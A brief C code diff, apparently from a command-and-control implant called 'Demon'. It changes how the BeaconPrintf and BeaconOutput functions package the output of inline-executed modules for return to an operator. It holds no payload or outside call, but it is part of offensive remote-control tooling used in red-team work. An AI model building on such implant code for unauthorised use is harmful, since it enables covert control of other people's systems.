@@ -160,7 +160,7 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
 {
     PRINTF( "BeaconPrintf( %d, %x, ... )\n", Type, fmt )
 
-    PPACKAGE    package         = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
+    PPACKAGE    package         = PackageCreate( DEMON_OUTPUT );
     va_list     VaListArg       = 0;
     PCHAR       CallbackOutput  = NULL;
     INT         CallbackSize    = 0;
@@ -184,12 +184,13 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
     Instance.Win32.LocalFree( CallbackOutput );
 }
 
-// TODO: use type for output or error
 VOID BeaconOutput( INT Type, PCHAR data, INT len )
 {
     PRINTF( "BeaconOutput( %d, %p, %d )\n", Type, data, len )
 
     PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
+
+    PackageAddInt32( Package, Type );
 
     PackageAddBytes( Package, data, len );
 
